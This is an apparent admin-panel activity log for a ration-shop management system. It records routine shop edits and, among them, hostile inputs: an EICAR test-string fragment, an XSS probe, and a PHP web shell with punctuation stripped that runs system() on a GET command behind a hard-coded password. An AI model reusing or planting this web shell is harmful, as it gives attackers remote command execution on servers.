[2025-07-01 13:49:13] User -> FPS deleted -> admin@pds| Requested JSON -> {"uid":"FPS_68526e08acb"} | X5opap4pzx54p7cc7eicarstandardantivirustestfilehh
[2025-07-01 13:49:18] User -> FPS deleted -> admin@pds| Requested JSON -> {"uid":"FPS_6853e02cbb9"} | php $password  Tester@12345  ifisset$_GETpassword  $_GETpassword  $password      ifisset$_GETcommand
[2025-07-01 13:50:09] User -> FPS added ->admin@pds| Requested JSON -> {"name":"abc","type":"Model FPS","latitude":"25.148","longitude":"54.963","district":"Ariyalur","id":"NNN","demand":"56","demand_rice":"68","demand_frice":"55"}
[2025-07-01 15:14:57] User -> Delete Message ->admin@pds| Requested JSON -> php
$password  Tester@12345

ifisset$_GETpassword  $_GETpassword  $password 
    ifisset$_GETcommand 
        echo system$_GETcommand
     else 
        echo No command specified.
    
 else 
    echo Authentication failed.

 | Pudukkottai@pds
[2025-07-01 15:14:57] User -> Delete Message ->admin@pds| Requested JSON ->  | 
[2025-07-01 15:14:57] User -> Delete Message ->admin@pds| Requested JSON ->  | 
[2025-07-01 15:14:58] User -> Delete Message ->admin@pds| Requested JSON ->  | 
[2025-07-01 15:14:58] User -> Delete Message ->admin@pds| Requested JSON ->  | 
[2025-07-01 15:14:58] User -> Delete Message ->admin@pds| Requested JSON ->  | 
[2025-07-01 15:14:58] User -> Delete Message ->admin@pds| Requested JSON -> scriptalertjunescript | Pudukkottai@pds
[2025-07-01 15:14:58] User -> Delete Message ->admin@pds| Requested JSON ->  | 
